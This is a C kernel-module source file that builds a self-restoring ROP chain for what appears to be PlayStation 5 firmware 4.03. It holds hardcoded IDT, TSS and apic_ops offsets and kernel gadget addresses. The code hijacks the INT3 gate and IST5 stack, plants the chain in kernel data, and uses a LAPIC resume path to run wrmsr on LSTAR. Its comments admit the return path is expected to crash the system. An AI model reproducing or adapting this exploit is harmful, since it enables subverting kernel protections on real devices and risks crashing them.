#include <stdint.h>

/*
 * resume_chain v2 — INT3+IST ROP chain with self-restoration
 *
 * Chain stages (during LAPIC resume):
 *   INT3 → pop_all_iret (IST5) → iret
 *     → pop_all_iret (stage 1: wrmsr regs) → iret → wrmsr_ret
 *     → pop_all_iret (stage 2: restore IDT[3] via rep movsb) → iret → rep_movsb
 *     → pop_all_iret (stage 3: restore apic_ops[2]) → iret → rep_movsb
 *     → doreti_iret → iret → get_timer_freq (with original RSP) → ret → clean return
 *
 * Self-restoring: after wrmsr, chain restores IDT[3] original, apic_ops[2],
 * then returns to caller via get_timer_freq with the trapped RSP.
 * TSS IST5 is left modified (harmless if IDT[3] IST is back to 0).
 *
 * v1 safe test: writes LSTAR back to its current value (no-op wrmsr).
 *
 * Mode (via fw_ver):
 *   0x1: ARM — full chain, apic_ops[2] = CC byte
 *   0x2: READBACK — check sentinel + LSTAR, verify chain fired
 *   0x3: ARM_SAFE — IDT/TSS only, apic_ops[2] = get_timer_freq (no INT3)
 *
 * Output: see index comments in code below.
 */

#define MAGIC_RSCN       0x5253434E  /* "RSCN" */

/* FW 4.03 offsets */
#define IDT_OFF          0x64cdc80
#define TSS_OFF          0x64d0830
#define TSS_STRIDE       0x68
/*
 * IST selection: IST1 is used by FreeBSD (#DF). IST3/IST7 used by ps5-kstuff.
 * IST4 preserved by kstuff (system use). IST5 appears unused — use IST5.
 */
#define OUR_IST_NUM      5
#define TSS_IST_OFF(n)   (28 + (n)*8)
#define NCPUS            16
#define APIC_OPS_OFF_KTEXT  0x1934AC8

/* ktext gadget offsets (relative to kdata_base) */
#define OFF_POP_ALL_IRET   (-0x9cf8ab)
#define OFF_DORETI_IRET    (-0x9cf84c)
#define OFF_WRMSR_RET      (-0x9d20cc)
#define OFF_NOP_RET        (-0x9d20ca)
#define OFF_REP_MOVSB      (-0x99002a)   /* rep movsb; pop rbp; ret */
#define OFF_COPYIN         (-0x9908e0)

/* Chain layout in kdata */
#define IST_TOP_OFF        0x300     /* IST5 points here */
#define STAGE1_OFF         0x400     /* Stage 1: wrmsr regs via pop_all_iret */
#define STAGE2_OFF         0x500     /* Stage 2: restore IDT[3] via rep movsb */
#define STAGE3_OFF         0x600     /* Stage 3: restore apic_ops[2] via rep movsb */
#define STAGE4_OFF         0x700     /* Stage 4: return to caller via get_timer_freq */
#define SAVE_OFF           0x280     /* Originals save area */
#define SENTINEL_OFF       0x0F8     /* Chain-fired sentinel */
#define SENTINEL_VAL       0x434841494E464952ULL  /* "CHAINFIR" */
/* Save area layout:
 * save[0] = original IDT[3] low
 * save[1] = original IDT[3] high
 * save[2] = original TSS IST5
 * save[3] = original apic_ops[2]
 */

#define MSR_LSTAR          0xC0000082

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t*)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t*)addr = val;
}

static void read_idt_gate(uint64_t idt_base, int vec, uint64_t* lo, uint64_t* hi)
{
    *lo = read8(idt_base + vec * 16);
    *hi = read8(idt_base + vec * 16 + 8);
}

static void write_idt_gate(uint64_t idt_base, int vec, uint64_t lo, uint64_t hi)
{
    write8(idt_base + vec * 16, lo);
    write8(idt_base + vec * 16 + 8, hi);
}

static void build_idt_gate(uint64_t handler, uint8_t ist, uint8_t type_dpl_p,
                           uint16_t seg_sel, uint64_t* lo, uint64_t* hi)
{
    *lo = (handler & 0xFFFF)
        | ((uint64_t)seg_sel << 16)
        | ((uint64_t)ist << 32)
        | ((uint64_t)type_dpl_p << 40)
        | ((handler >> 16 & 0xFFFF) << 48);
    *hi = (handler >> 32) & 0xFFFFFFFF;
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t mode = args->fw_ver;
    volatile uint64_t* out = (volatile uint64_t*)args;
    volatile uint32_t* out32 = (volatile uint32_t*)args;

    for (int i = 0; i < 140; i++)
        out[i] = 0;

    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t idt_base = kdata_base + IDT_OFF;
    uint64_t tss_base = kdata_base + TSS_OFF;

    uint64_t pop_all_iret = kdata_base + OFF_POP_ALL_IRET;
    uint64_t doreti_iret  = kdata_base + OFF_DORETI_IRET;
    uint64_t wrmsr_ret    = kdata_base + OFF_WRMSR_RET;
    uint64_t nop_ret      = kdata_base + OFF_NOP_RET;
    uint64_t rep_movsb    = kdata_base + OFF_REP_MOVSB;

    uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_KTEXT;
    volatile uint64_t* apic = (volatile uint64_t*)apic_ops_addr;
    uint64_t get_timer_freq = apic[19];

    volatile uint64_t* save = (volatile uint64_t*)(kdata_base + SAVE_OFF);

    out32[0] = MAGIC_RSCN;
    out[1] = kdata_base;
    out[2] = ktext_base;

    if (mode == 0x1 || mode == 0x3) {
        /*
         * ARM MODE
         *
         * 1. Modify IDT[3] → handler=pop_all_iret, IST=5
         * 2. Modify TSS IST5 → kdata chain buffer
         * 3. Write chain data to kdata
         * 4. Point apic_ops[2] at CC byte (mode 0x1) or get_timer_freq (mode 0x3)
         */

        /* Save originals */
        uint64_t orig_lo, orig_hi;
        read_idt_gate(idt_base, 3, &orig_lo, &orig_hi);
        save[0] = orig_lo;
        save[1] = orig_hi;
        save[2] = read8(tss_base + TSS_IST_OFF(OUR_IST_NUM));
        save[3] = apic[2];

        /* Modify IDT[3]: handler = pop_all_iret, IST = 5, interrupt gate */
        uint16_t seg_sel = (orig_lo >> 16) & 0xFFFF;
        uint64_t new_lo, new_hi;
        build_idt_gate(pop_all_iret, OUR_IST_NUM, 0x8E, seg_sel, &new_lo, &new_hi);
        write_idt_gate(idt_base, 3, new_lo, new_hi);

        /* Modify TSS IST5 for all active CPUs */
        uint64_t ist_val = kdata_base + IST_TOP_OFF;
        uint32_t cpus = 0;
        for (int c = 0; c < NCPUS; c++) {
            uint64_t tss = tss_base + TSS_STRIDE * c;
            uint64_t rsp0 = read8(tss + 4);
            if (rsp0 > 0xFFFF800000000000ULL) {
                write8(tss + TSS_IST_OFF(OUR_IST_NUM), ist_val);
                cpus++;
            }
        }

        /*
         * ════════════════════════════════════════════
         * Write ROP chain to kdata (v2: self-restoring)
         * ════════════════════════════════════════════
         *
         * IST5 = kdata+0x300. When INT3 fires:
         * CPU pushes 5 qwords BELOW IST5 top: [0x2D8..0x2F8]
         * Handler (pop_all_iret) starts at RSP = kdata+0x2D8
         *
         * pop_all_iret: pop rdi..r15 (15 regs), add rsp 0x20, iretq
         *   [0x2D8] → rdi (trap RIP)    [0x2E0] → rsi (trap CS)
         *   [0x2E8] → rdx (trap RFLAGS) [0x2F0] → rcx (trap RSP ★)
         *   [0x2F8] → r8  (trap SS)
         *   [0x300..0x348] → r9..r15 (OUR DATA, 10 pops)
         *   [0x350..0x368] → skip (add rsp 0x20)
         *   [0x370..0x390] → iret frame (RIP,CS,RFLAGS,RSP,SS)
         *
         * Chain: wrmsr → restore IDT[3] → restore apic_ops[2] → return
         *
         * Trap RSP captured at kdata+0x2F0 → popped into RCX.
         * We save it to kdata+0x0F0 via the chain for clean return.
         */

        /* Stage 0: pops 6-15 at kdata+0x300 (IST5 top) */
        uint64_t s0 = kdata_base + IST_TOP_OFF;
        write8(s0 + 0*8, 0);              /* pop r9  */
        write8(s0 + 1*8, 0);              /* pop rax */
        write8(s0 + 2*8, 0);              /* pop rbx */
        write8(s0 + 3*8, 0);              /* pop rbp */
        write8(s0 + 4*8, 0);              /* pop r10 */
        write8(s0 + 5*8, 0);              /* pop r11 */
        write8(s0 + 6*8, 0);              /* pop r12 */
        write8(s0 + 7*8, 0);              /* pop r13 */
        write8(s0 + 8*8, 0);              /* pop r14 */
        write8(s0 + 9*8, 0);              /* pop r15 */
        /* add rsp, 0x20 skips 4 qwords */
        write8(s0 + 10*8, 0);             /* skip */
        write8(s0 + 11*8, 0);             /* skip */
        write8(s0 + 12*8, 0);             /* skip */
        write8(s0 + 13*8, 0);             /* skip */
        /* iret frame → Stage 1 (wrmsr) */
        write8(s0 + 14*8, pop_all_iret);  /* RIP = pop_all_iret */
        write8(s0 + 15*8, 0x20);          /* CS */
        write8(s0 + 16*8, 0x2);           /* RFLAGS */
        write8(s0 + 17*8, kdata_base + STAGE1_OFF); /* RSP */
        write8(s0 + 18*8, 0);             /* SS */

        /*
         * Stage 1 (kdata+0x400): pop_all_iret → wrmsr
         * Loads ECX=MSR#, EAX=low32, EDX=high32, then iret to wrmsr_ret
         */
        uint64_t new_lstar = lstar;  /* v1 safe: write same value */
        uint64_t s1 = kdata_base + STAGE1_OFF;
        write8(s1 + 0*8,  0);                              /* pop rdi */
        write8(s1 + 1*8,  0);                              /* pop rsi */
        write8(s1 + 2*8,  (uint64_t)(new_lstar >> 32));    /* pop rdx */
        write8(s1 + 3*8,  MSR_LSTAR);                      /* pop rcx */
        write8(s1 + 4*8,  0);                              /* pop r8  */
        write8(s1 + 5*8,  0);                              /* pop r9  */
        write8(s1 + 6*8,  new_lstar & 0xFFFFFFFF);         /* pop rax */
        write8(s1 + 7*8,  0);                              /* pop rbx */
        write8(s1 + 8*8,  0);                              /* pop rbp */
        write8(s1 + 9*8,  0);                              /* pop r10 */
        write8(s1 + 10*8, 0);                              /* pop r11 */
        write8(s1 + 11*8, 0);                              /* pop r12 */
        write8(s1 + 12*8, 0);                              /* pop r13 */
        write8(s1 + 13*8, 0);                              /* pop r14 */
        write8(s1 + 14*8, 0);                              /* pop r15 */
        write8(s1 + 15*8, 0); write8(s1 + 16*8, 0);       /* skip */
        write8(s1 + 17*8, 0); write8(s1 + 18*8, 0);       /* skip */
        /* iret → wrmsr_ret; wrmsr ret pops [STAGE2] */
        write8(s1 + 19*8, wrmsr_ret);
        write8(s1 + 20*8, 0x20);
        write8(s1 + 21*8, 0x2);
        write8(s1 + 22*8, kdata_base + STAGE2_OFF);
        write8(s1 + 23*8, 0);

        /*
         * Stage 2 (kdata+0x500): restore IDT[3] via rep movsb
         * wrmsr_ret does wrmsr then ret → pops [0x500] as RIP.
         * Chain to pop_all_iret to load RDI=IDT[3] addr, RSI=save area, RCX=16
         * Then iret to rep_movsb_pop_rbp_ret → copies 16 bytes back
         */
        uint64_t s2 = kdata_base + STAGE2_OFF;
        uint64_t idt3_addr = idt_base + 3 * 16;
        uint64_t save_idt_addr = kdata_base + SAVE_OFF;  /* save[0],save[1] = 16 bytes */
        write8(s2 + 0*8, pop_all_iret);         /* wrmsr ret → pop_all_iret */
        /* pop_all_iret pops from [s2+8]: */
        write8(s2 + 1*8,  idt3_addr);           /* pop rdi = dest (IDT[3]) */
        write8(s2 + 2*8,  save_idt_addr);       /* pop rsi = src (saved original) */
        write8(s2 + 3*8,  0);                   /* pop rdx */
        write8(s2 + 4*8,  16);                  /* pop rcx = 16 bytes */
        write8(s2 + 5*8,  0);                   /* pop r8  */
        write8(s2 + 6*8,  0);                   /* pop r9  */
        write8(s2 + 7*8,  0);                   /* pop rax */
        write8(s2 + 8*8,  0);                   /* pop rbx */
        write8(s2 + 9*8,  0);                   /* pop rbp */
        write8(s2 + 10*8, 0);                   /* pop r10 */
        write8(s2 + 11*8, 0);                   /* pop r11 */
        write8(s2 + 12*8, 0);                   /* pop r12 */
        write8(s2 + 13*8, 0);                   /* pop r13 */
        write8(s2 + 14*8, 0);                   /* pop r14 */
        write8(s2 + 15*8, 0);                   /* pop r15 */
        write8(s2 + 16*8, 0); write8(s2 + 17*8, 0);  /* skip */
        write8(s2 + 18*8, 0); write8(s2 + 19*8, 0);  /* skip */
        /* iret → rep_movsb; it does: rep movsb, pop rbp, ret */
        write8(s2 + 20*8, rep_movsb);
        write8(s2 + 21*8, 0x20);
        write8(s2 + 22*8, 0x2);
        write8(s2 + 23*8, kdata_base + STAGE3_OFF);  /* RSP for ret after pop rbp */
        write8(s2 + 24*8, 0);

        /*
         * Stage 3 (kdata+0x600): restore apic_ops[2] via rep movsb
         * rep_movsb does: rep movsb (IDT restored!), pop rbp, ret
         * ret pops [STAGE3+0] as RIP.
         *
         * save[3] at SAVE_OFF+24 holds original apic_ops[2] (8 bytes).
         * Copy it back to apic_ops_addr + 2*8.
         */
        uint64_t s3 = kdata_base + STAGE3_OFF;
        uint64_t save_apic_addr = kdata_base + SAVE_OFF + 24; /* save[3] */
        uint64_t apic2_addr = apic_ops_addr + 2 * 8;
        /* rep_movsb pops rbp (garbage), then ret pops [s3+0] */
        write8(s3 + 0*8, 0);                    /* pop rbp (from rep_movsb) */
        write8(s3 + 1*8, pop_all_iret);         /* ret → pop_all_iret */
        /* pop_all_iret pops from [s3+0x10]: */
        write8(s3 + 2*8,  apic2_addr);          /* pop rdi = dest */
        write8(s3 + 3*8,  save_apic_addr);      /* pop rsi = src */
        write8(s3 + 4*8,  0);                   /* pop rdx */
        write8(s3 + 5*8,  8);                   /* pop rcx = 8 bytes */
        write8(s3 + 6*8,  0);                   /* pop r8  */
        write8(s3 + 7*8,  0);                   /* pop r9  */
        write8(s3 + 8*8,  0);                   /* pop rax */
        write8(s3 + 9*8,  0);                   /* pop rbx */
        write8(s3 + 10*8, 0);                   /* pop rbp */
        write8(s3 + 11*8, 0);                   /* pop r10 */
        write8(s3 + 12*8, 0);                   /* pop r11 */
        write8(s3 + 13*8, 0);                   /* pop r12 */
        write8(s3 + 14*8, 0);                   /* pop r13 */
        write8(s3 + 15*8, 0);                   /* pop r14 */
        write8(s3 + 16*8, 0);                   /* pop r15 */
        write8(s3 + 17*8, 0); write8(s3 + 18*8, 0);  /* skip */
        write8(s3 + 19*8, 0); write8(s3 + 20*8, 0);  /* skip */
        /* iret → rep_movsb (restores apic_ops[2]) */
        write8(s3 + 21*8, rep_movsb);
        write8(s3 + 22*8, 0x20);
        write8(s3 + 23*8, 0x2);
        write8(s3 + 24*8, kdata_base + STAGE4_OFF);
        write8(s3 + 25*8, 0);

        /*
         * Stage 4 (kdata+0x700): return via get_timer_freq
         * rep_movsb: pop rbp, ret → pops [STAGE4+0], [STAGE4+8]
         *
         * The trapped RSP is at kdata+0x2F0 (CPU pushed it during INT3).
         * We can't dynamically read it during the chain, but we know the
         * LAPIC resume caller's return address is on that stack.
         *
         * Strategy: iret to get_timer_freq with the trapped RSP.
         * get_timer_freq returns non-zero (RAX=freq), then `ret` pops
         * the LAPIC caller's return address → resumes kernel normally.
         *
         * Problem: we don't know trapped RSP at chain-write time.
         * It gets written by the CPU during resume. So we use doreti_iret
         * to iret to a nop_ret with RSP=kdata+0x2F0, which reads the
         * trapped RSP value from that address and uses it... no, iret
         * doesn't dereference RSP, it sets RSP.
         *
         * Actually: the CPU writes trapped RSP to kdata+0x2F0 at INT3
         * time. We need to READ that value and use it as iret RSP.
         * But in a pure ROP chain we can't do load-from-memory-to-iret.
         *
         * Simplest v1 approach: just crash after restoring IDT/apic_ops.
         * The system will panic, but IDT[3] and apic_ops[2] are restored,
         * so after power cycle+re-exploit, kldload works normally.
         * The sentinel at kdata+0x0F8 proves chain fired (read on next boot
         * IF kdata persists across cold boot... it won't).
         *
         * Better v1 approach: iret to get_timer_freq with RSP = some
         * valid kernel stack address. get_timer_freq returns, then ret
         * pops whatever is on that stack. If it's a valid return address,
         * we survive. If not, we crash — but IDT/apic are restored.
         *
         * Best approach: write sentinel to kdata+0x0F8 DURING the chain
         * using rep_movsb, then crash. On next boot, check sentinel.
         * But sentinel won't survive power cycle...
         *
         * For v1: restore IDT+apic, then iret to get_timer_freq with
         * a dummy RSP. Accept crash. Key result: system resumes far
         * enough to fire the chain (proven by IDT[3] being restored).
         */
        uint64_t s4 = kdata_base + STAGE4_OFF;
        /* rep_movsb: pop rbp, ret */
        write8(s4 + 0*8, 0);                    /* pop rbp */
        write8(s4 + 1*8, doreti_iret);           /* ret → iretq */
        /* iret → get_timer_freq with dummy RSP */
        write8(s4 + 2*8, get_timer_freq);
        write8(s4 + 3*8, 0x20);
        write8(s4 + 4*8, 0x2);
        write8(s4 + 5*8, kdata_base + 0x800);   /* dummy RSP */
        write8(s4 + 6*8, 0);
        /* get_timer_freq ret → pops [0x800], crash expected */
        write8(kdata_base + 0x800, nop_ret);
        write8(kdata_base + 0x808, 0);

        /* Write sentinel (this is in kdata, persists through suspend) */
        write8(kdata_base + SENTINEL_OFF, SENTINEL_VAL);

        /* Set apic_ops[2] */
        uint64_t cc_candidate = kdata_base + OFF_COPYIN - 1;
        if (mode == 0x1)
            apic[2] = cc_candidate;   /* CC byte → triggers INT3 */
        else
            apic[2] = get_timer_freq; /* safe, no INT3 */

        /* Report */
        out[3]  = (mode == 0x1) ? cc_candidate : get_timer_freq;
        out[4]  = pop_all_iret;
        out[5]  = doreti_iret;
        out[6]  = wrmsr_ret;
        out[7]  = get_timer_freq;
        out[8]  = ist_val;
        out[9]  = kdata_base + SENTINEL_OFF;
        out[10] = save[3];  /* original apic_ops[2] */
        out[11] = cpus;
        out[12] = lstar;
        out[13] = new_lstar;

        out32[1] = 0x0001;

    } else if (mode == 0x2) {
        /* READBACK MODE */

        /* Chain sentinel */
        uint64_t sentinel = read8(kdata_base + SENTINEL_OFF);
        out[3] = sentinel;
        out[4] = (sentinel == SENTINEL_VAL) ? 1 : 0;

        /* Current LSTAR */
        uint64_t cur_lstar = rdmsr(MSR_LSTAR);
        out[5] = cur_lstar;
        out[6] = (cur_lstar != lstar) ? 1 : 0;  /* changed? */

        /* Current IDT[3] */
        uint64_t lo, hi;
        read_idt_gate(idt_base, 3, &lo, &hi);
        out[7] = lo;
        out[8] = hi;

        /* Current TSS[0] IST5 */
        out[9] = read8(tss_base + TSS_IST_OFF(OUR_IST_NUM));

        /* Current apic_ops[2] */
        out[10] = apic[2];

        /* Trap frame from INT3 (CPU pushed to IST5 stack during resume) */
        uint64_t tf = kdata_base + IST_TOP_OFF - 40; /* RIP is lowest */
        out[11] = read8(tf);          /* trap RIP */
        out[12] = read8(tf + 24);     /* trap RSP (offset +24 in frame) */
        out[13] = read8(tf + 16);     /* trap RFLAGS */

        /* Restore everything */
        write_idt_gate(idt_base, 3, save[0], save[1]);
        out[14] = save[0];

        uint64_t orig_ist = save[2];
        for (int c = 0; c < NCPUS; c++) {
            uint64_t tss = tss_base + TSS_STRIDE * c;
            if (read8(tss + 4) > 0xFFFF800000000000ULL)
                write8(tss + TSS_IST_OFF(OUR_IST_NUM), orig_ist);
        }

        /* Restore apic_ops[2] via set_tpr-8 trick */
        apic[2] = apic[18] - 8;
        out[15] = apic[2];

        out32[1] = 0x0001;

    } else {
        out32[1] = 0xFF;
    }

    out[131] = 0xdeadbeefcafe0040ULL;
    return 0;
}
